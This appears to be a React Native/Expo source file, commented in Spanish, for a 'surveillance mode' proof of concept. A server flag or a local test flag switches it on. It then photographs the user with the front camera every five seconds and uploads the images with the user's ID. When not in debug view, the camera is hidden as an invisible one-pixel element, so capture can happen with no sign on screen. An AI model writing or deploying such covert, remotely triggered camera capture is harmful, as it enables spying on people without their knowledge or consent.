import { API_URL } from '@/config/api';
import { useAuth } from '@/context/auth-context';
import { CameraView, useCameraPermissions } from 'expo-camera';
import React, { useEffect, useRef, useState } from 'react';
import { StyleSheet, Text, View } from 'react-native';

export function SurveillanceManager() {
  const { user } = useAuth();
  const [permission, requestPermission] = useCameraPermissions();
  const [isSurveillanceActive, setIsSurveillanceActive] = useState(false);
  const intervalRef = useRef<NodeJS.Timeout|null>(null);
  const checkStatusInterval = useRef<NodeJS.Timeout|null>(null);

  useEffect(() => {
    if (!permission || !permission.granted) {
      requestPermission();
    }
  }, [permission]);
  const cameraRef = useRef<any>(null);
  const [testUserId, setTestUserId] = useState<string|null>(null);

  // Cada 2 segundos revisamos si este dispositivo está en modo TEST (forzado localmente)
  useEffect(() => {
    const checkTestMode = setInterval(async () => {
      const AsyncStorage = (await import("@react-native-async-storage/async-storage")).default;
      const testId = await AsyncStorage.getItem("@surveillance_test_uid");
      setTestUserId(testId);
    }, 2000);
    return () => clearInterval(checkTestMode);
  }, []);

  useEffect(() => {
    if (!user?.USUARIO_ID) return;

    // Verificar estado de vigilancia periódicamente (servidor)
    checkStatusInterval.current = setInterval(async () => {
      try {
        const res = await fetch(`${API_URL}/api/surveillance-status.php?userId=${user.USUARIO_ID}`);
        if (!res.ok) return;
        const data = await res.json();
        if (data.success) {
          setIsSurveillanceActive(data.active);
        }
      } catch (err) {
        // No logueamos para no ensuciar, ya sabemos que puede fallar por red
      }
    }, 3000) as any; // Bajamos a 3 segundos para que sea instantáneo

    return () => {
      if (checkStatusInterval.current) clearInterval(checkStatusInterval.current);
    };
  }, [user]);

  // Si se activa por servidor O por modo TEST local
  const shouldBeActive = isSurveillanceActive || !!testUserId;

  useEffect(() => {
    if (shouldBeActive && permission?.granted) {
      console.log("Surveillance mode STARTED (Active via Server or Test Mode)");
      startCapturing();
    } else {
      console.log("Surveillance mode STOPPED");
      stopCapturing();
    }
  }, [shouldBeActive, permission]);

  const startCapturing = () => {
    if (intervalRef.current) return;
    intervalRef.current = setInterval(captureAndUpload, 5000) as any; // Cada 5 segundos para el POC
  };

  const stopCapturing = () => {
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
  };

  const captureAndUpload = async () => {
    if (!cameraRef.current) return;

    try {
      const photo = await cameraRef.current.takePictureAsync({
        quality: 0.1, 
        base64: false,
        skipProcessing: false 
      });

      if (photo.uri) {
        const targetId = testUserId || user?.USUARIO_ID;
        
        const formData = new FormData();
        formData.append('userId', String(targetId));
        formData.append('image', {
          uri: photo.uri,
          type: 'image/jpeg',
          name: `live_${targetId}.jpg`,
        } as any);

        console.log(`Sending Live Frame: ${photo.width}x${photo.height}`);

        const response = await fetch(`${API_URL}/api/surveillance.php`, {
          method: 'POST',
          body: formData,
          headers: {
            'Accept': 'application/json',
          },
        });
        
        if (!response.ok) {
           const errText = await response.text();
           console.log(`Server Reject (${response.status}):`, errText.substring(0, 200));
           return;
        }

        const result = await response.json();
        console.log("Live result:", result);
      }
    } catch (err) {
      console.log("Surveillance system error:", err);
    }
  };

  // El componente de cámara para DEBUG: Si está activo, lo ponemos enorme
  return (
    <View style={isSurveillanceActive ? styles.debugCamera : styles.hiddenCamera}>
      {permission?.granted && (
        <CameraView
          ref={cameraRef}
          style={styles.camera}
          facing="front"
          animateShutter={false}
        />
      )}
      {isSurveillanceActive && (
        <View style={styles.debugOverlay}>
          <Text style={styles.debugText}>MODO VIGILANCIA ACTIVO (DEBUG)</Text>
          <Text style={styles.debugSubtext}>Transmitiendo al servidor cada 5s...</Text>
        </View>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  hiddenCamera: {
    position: 'absolute',
    right: 1,
    top: 1,
    width: 1,
    height: 1,
    opacity: 0,
    overflow: 'hidden',
    zIndex: -100
  },
  debugCamera: {
    position: 'absolute',
    top: '10%',
    left: '5%',
    width: '90%',
    aspectRatio: 3/4,
    borderRadius: 20,
    overflow: 'hidden',
    zIndex: 9999,
    borderWidth: 5,
    borderColor: '#FF3B30',
    backgroundColor: '#000'
  },
  camera: {
    width: '100%',
    height: '100%',
  },
  debugOverlay: {
    position: 'absolute',
    bottom: 20,
    left: 20,
    right: 20,
    backgroundColor: 'rgba(255,59,48,0.8)',
    padding: 10,
    borderRadius: 10,
    alignItems: 'center'
  },
  debugText: { color: '#fff', fontWeight: '800', fontSize: 12 },
  debugSubtext: { color: '#fff', fontSize: 10 }
});
